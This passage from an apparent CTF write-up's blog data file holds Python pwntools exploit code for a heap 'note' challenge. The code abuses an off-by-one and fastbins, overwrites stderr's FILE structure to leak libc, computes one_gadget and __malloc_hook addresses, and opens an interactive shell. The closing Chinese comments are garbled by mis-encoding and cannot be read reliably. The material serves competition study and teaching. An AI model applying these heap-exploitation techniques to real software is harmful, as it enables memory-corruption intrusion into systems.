allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># off-by-one leak stderr</span></span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">7</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0xd8</span>,<span class="string">b&#x27;\xd8&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;\x18&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;\xdd\x45&#x27;</span>)</span><br><span class="line">    deleteNote(<span class="number">0</span>,<span class="number">13</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x18</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">b&#x27;\x68&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&#x27;\x58&#x27;</span></span><br><span class="line">    dbg(<span class="number">1</span>)</span><br><span class="line">    allocNote(<span class="number">0</span>,<span class="number">0x68</span>,payload)</span><br><span class="line">    libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] - <span class="number">0x163</span></span><br><span class="line">    info(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45206</span>,<span class="number">0x4525a</span>,<span class="number">0xef9f4</span>,<span class="number">0xf0897</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  one_gadget[i] = libc_base + one_gadget[i]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">  </span><br><span class="line"><span class="comment"># æœ¬é¢˜æ€æƒ³ï¼š</span></span><br><span class="line">  <span class="comment"># 1. ç»™ç»“æ„ä½“ç”³è¯·chunkæ—¶ï¼Œé€šå¸¸ä¼šæŠŠèƒ½writeçš„éƒ¨åˆ†éš”ç¦»å¼€æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆé€šè¿‡fastbinï¼ŒæŠŠâ€œä¸èƒ½writeçš„éƒ¨åˆ†â€æ”¾åœ¨ä¸€èµ·</span></span><br><span class="line">  <span class="comment"># 2. é€†å‘æ¯”è¾ƒå¤æ‚çš„å †é¢˜æ—¶ï¼Œè¦æŠŠæ¯ä¸ªå‡½æ•°æŠ½è±¡æˆâ€œå¯¹ heap çš„æ“ä½œâ€ï¼Œæ–¹ä¾¿ç†è§£</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
</search>
